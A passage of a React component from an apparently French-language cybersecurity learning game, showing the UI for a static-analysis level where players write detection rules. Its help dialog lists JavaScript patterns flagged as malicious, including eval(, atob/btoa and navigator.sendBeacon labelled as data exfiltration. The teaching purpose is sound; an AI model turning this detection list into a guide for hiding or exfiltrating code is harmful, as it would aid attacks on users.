                        <div className="bg-green-900/20 border border-green-500/20 p-3 rounded-lg text-center mt-3">
                          <div className="text-green-400 font-medium flex items-center justify-center">
                            <Check className="h-5 w-5 mr-2" />
                            Niveau complété !
                          </div>
                          <Link href="/cyber/arcade/code-shield">
                            <Button className="mt-2 bg-green-700 hover:bg-green-800 text-white">
                              Continuer
                              <ChevronRight className="ml-2 h-4 w-4" />
                            </Button>
                          </Link>
                        </div>
                      )}
                    </div>
                  )}
                  
                  {/* Liste des règles */}
                  <div>
                    <div className="flex justify-between mb-2">
                      <h3 className="text-sm font-medium text-white">Règles actives</h3>
                      <span className="text-xs text-gray-400">{rules.filter(r => r.enabled).length}/{rules.length} activées</span>
                    </div>
                    
                    <div className="space-y-2 max-h-[300px] overflow-y-auto pr-1">
                      {rules.map(rule => (
                        <div 
                          key={rule.id} 
                          className={`border ${rule.enabled ? 'border-blue-500/30' : 'border-gray-700 opacity-60'} rounded-lg bg-slate-800/50 overflow-hidden`}
                        >
                          <div className="flex items-center justify-between p-2 border-b border-gray-700">
                            <div className="flex items-center">
                              <span className={`${getRuleTypeColor(rule.type)} px-2 py-0.5 rounded-md text-xs font-medium flex items-center`}>
                                {rule.type}
                              </span>
                              <Switch 
                                checked={rule.enabled} 
                                onCheckedChange={() => toggleRule(rule.id)}
                                className="ml-2"
                              />
                            </div>
                            <Button 
                              variant="ghost" 
                              size="icon"
                              onClick={() => deleteRule(rule.id)}
                              className="h-6 w-6 rounded-full hover:bg-red-900/20 hover:text-red-400"
                            >
                              <X className="h-3 w-3" />
                            </Button>
                          </div>
                          <div className="p-2">
                            <div className="mb-1 flex items-center justify-between">
                              <div className="font-mono text-xs bg-slate-950/50 px-1.5 py-0.5 rounded text-blue-300">
                                {rule.pattern}
                              </div>
                              <Badge className={rule.isMalicious 
                                ? "bg-red-900/20 text-red-400 border-red-500/30" 
                                : "bg-gray-900/50 text-gray-400 border-gray-700"}
                              >
                                {rule.isMalicious ? 'Malveillant' : 'Neutre'}
                              </Badge>
                            </div>
                            <p className="text-gray-400 text-xs">{rule.description}</p>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                  
                  {/* Formulaire d'ajout de règle */}
                  {isAddingRule ? (
                    <div className="mt-4 bg-blue-900/20 border border-blue-500/20 p-3 rounded-lg">
                      <h3 className="text-white text-sm font-medium mb-3">Nouvelle règle</h3>
                      
                      <div className="space-y-3">
                        <div>
                          <label className="text-xs text-gray-400 block mb-1">Type de règle</label>
                          <Select 
                            value={newRule.type} 
                            onValueChange={value => setNewRule({...newRule, type: value})}
                          >
                            <SelectTrigger className="w-full bg-slate-800 border-gray-700 text-sm">
                              <SelectValue placeholder="Type de règle" />
                            </SelectTrigger>
                            <SelectContent className="bg-slate-800 border-gray-700">
                              <SelectItem value="pattern">Motif de texte</SelectItem>
                              <SelectItem value="function">Fonction suspecte</SelectItem>
                              <SelectItem value="import">Import / Dépendance</SelectItem>
                              <SelectItem value="api">Appel d'API</SelectItem>
                            </SelectContent>
                          </Select>
                          <p className="text-xs text-gray-500 mt-1">
                            {getRuleTypeDescription(newRule.type)}
                          </p>
                        </div>
                        
                        <div>
                          <label className="text-xs text-gray-400 block mb-1">Motif à rechercher</label>
                          <Input
                            value={newRule.pattern}
                            onChange={e => setNewRule({...newRule, pattern: e.target.value})}
                            placeholder="ex: eval(, document.write("
                            className="bg-slate-800 border-gray-700"
                          />
                        </div>
                        
                        <div>
                          <label className="text-xs text-gray-400 block mb-1">Description</label>
                          <Textarea
                            value={newRule.description}
                            onChange={e => setNewRule({...newRule, description: e.target.value})}
                            placeholder="Expliquez pourquoi ce motif est suspect"
                            className="bg-slate-800 border-gray-700 h-16 resize-none"
                          />
                        </div>
                        
                        <div className="flex items-center space-x-2">
                          <label className="text-xs text-gray-400">Indiquer comme malveillant</label>
                          <Switch 
                            checked={newRule.isMalicious} 
                            onCheckedChange={value => setNewRule({...newRule, isMalicious: value})}
                          />
                        </div>
                        
                        <div className="flex space-x-2 pt-2">
                          <Button 
                            onClick={addRule}
                            className="bg-blue-600 hover:bg-blue-700 text-white"
                            disabled={!newRule.pattern || !newRule.description}
                          >
                            Ajouter
                          </Button>
                          <Button 
                            variant="outline" 
                            className="border-gray-700"
                            onClick={() => setIsAddingRule(false)}
                          >
                            Annuler
                          </Button>
                        </div>
                      </div>
                    </div>
                  ) : (
                    <Button 
                      onClick={() => setIsAddingRule(true)}
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white"
                    >
                      <PlusCircle className="mr-2 h-4 w-4" />
                      Ajouter une règle
                    </Button>
                  )}
                </CardContent>
              </Card>
            </div>
          </div>
        </div>
      </div>
      
      {/* Dialogue d'aide */}
      <Dialog open={showHelp} onOpenChange={setShowHelp}>
        <DialogContent className="bg-slate-900 border-blue-500/30 max-w-2xl">
          <DialogHeader>
            <DialogTitle className="text-white">Aide niveau 2: Analyse Statique</DialogTitle>
            <DialogDescription className="text-gray-400">
              Guide pour comprendre et réussir ce niveau
            </DialogDescription>
          </DialogHeader>
          
          <div className="space-y-4 text-gray-300">
            <div>
              <h3 className="text-white font-medium mb-2">Qu'est-ce que l'analyse statique ?</h3>
              <p>
                L'analyse statique consiste à examiner le code source ou le contenu d'un fichier sans l'exécuter.
                Cette technique permet d'identifier des patterns, fonctions ou structures suspectes qui pourraient
                indiquer un comportement malveillant.
              </p>
            </div>
            
            <div>
              <h3 className="text-white font-medium mb-2">Comment créer des règles efficaces</h3>
              <ul className="list-disc pl-5 space-y-1">
                <li>Recherchez des fonctions JavaScript dangereuses comme <code className="text-blue-300">eval()</code>, <code className="text-blue-300">document.write()</code></li>
                <li>Identifiez les manipulations suspectes du DOM qui pourraient injecter du contenu malveillant</li>
                <li>Repérez les connections à des domaines suspects ou des techniques d'obfuscation</li>
                <li>Attention aux techniques d'encodage ou de décodage qui peuvent masquer du code malveillant</li>
              </ul>
            </div>
            
            <div className="bg-blue-900/20 p-4 rounded-lg border border-blue-500/20">
              <h3 className="text-blue-300 font-medium mb-2">Patterns couramment malveillants</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                <div className="bg-blue-900/10 p-2 rounded text-sm">
                  <code className="text-blue-300">eval(</code> - Exécution de code arbitraire
                </div>
                <div className="bg-blue-900/10 p-2 rounded text-sm">
                  <code className="text-blue-300">document.write(</code> - Injection de contenu HTML
                </div>
                <div className="bg-blue-900/10 p-2 rounded text-sm">
                  <code className="text-blue-300">btoa(</code> / <code className="text-blue-300">atob(</code> - Encodage/décodage Base64
                </div>
                <div className="bg-blue-900/10 p-2 rounded text-sm">
                  <code className="text-blue-300">new Worker(</code> - Exécution en arrière-plan
                </div>
                <div className="bg-blue-900/10 p-2 rounded text-sm">
                  <code className="text-blue-300">navigator.sendBeacon</code> - Exfiltration de données
                </div>
                <div className="bg-blue-900/10 p-2 rounded text-sm">
                  <code className="text-blue-300">fetch(</code> - Appels réseau (peut être légitime)
                </div>
              </div>
            </div>
            
            <div>
              <h3 className="text-white font-medium mb-2">Objectif du niveau</h3>
              <p>
                Pour réussir ce niveau, vous devez créer des règles qui détectent tous les fichiers malveillants
                tout en minimisant les faux positifs (fichiers légitimes incorrectement identifiés comme malveillants).
              </p>
            </div>
          </div>
          
          <DialogFooter>
            <Button
              onClick={() => setShowHelp(false)}
              className="bg-blue-600 hover:bg-blue-700 text-white"
            >
              J'ai compris
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </HomeLayout>
  );
}